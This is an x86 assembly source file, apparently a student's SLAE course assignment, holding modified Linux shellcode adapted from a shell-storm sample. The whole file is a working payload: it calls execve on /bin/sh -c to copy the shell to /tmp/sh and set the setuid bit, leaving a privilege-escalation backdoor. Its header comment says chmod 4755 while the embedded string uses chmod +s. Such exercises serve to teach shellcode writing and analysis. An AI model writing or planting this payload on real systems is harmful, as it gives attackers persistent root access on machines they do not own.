;; SLAE Assignment #6: Modified Shellcode cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh
;; Website:  http://blog.jsiob.com
;; SLAE-ID: 1400
;; Original ShellCode: http://shell-storm.org/shellcode/files/shellcode-540.php



global _start			

section .text
_start:

	xor edx, edx		; set edx to 0
	push edx			; NULL
	mul edx				; set eax to 0
	mov al, 0xb			; execve()		
	push edx			; NULL
	push word 0x632d	; "c-"	
	mov edi,esp			; point edi to stack
	push edx			; NULL
	push 0x68732f2f		; "hs//"
	push 0x6e69622f		; "/bin"
	mov ebx,esp			; point ebx to stack
	push edx			; NULL

	jmp short cmd

execute:

	push edi		; "c-"
	push ebx		; "/bin/sh"
	mov ecx,esp		; point to stack
	int 0x80		; execute execve

cmd:
	call execute
	db "cp /bin/sh /tmp/sh; chmod +s /tmp/sh"
